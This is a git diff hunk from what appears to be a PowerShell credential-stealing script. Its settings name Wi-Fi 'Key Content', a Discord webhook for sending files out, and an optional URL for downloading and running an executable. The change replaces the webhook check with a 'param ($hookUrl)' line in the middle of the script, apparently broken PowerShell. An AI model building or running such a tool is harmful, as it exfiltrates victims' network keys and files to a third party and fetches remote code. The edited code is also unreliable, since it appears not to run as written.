@@ -30,7 +30,8 @@ foreach ($feature in $features.Keys) { if (-not (Test-Path "variable:$feature"))
 
 <# Extras #>
 if ([string]::IsNullOrEmpty($keyContentLabel)) { $keyContentLabel = "Conteúdo da Chave|Key Content" }
-if ([string]::IsNullOrEmpty($hookUrl)) { Write-Output "You need to define a Discord webhook URL."; exit }
+param ($hookUrl)
+
 if ($executeExe -and [string]::IsNullOrEmpty($exeUrl)) { Write-Output "You need to define a URL for your executable."; exit }
 $filesToSend = @()
 
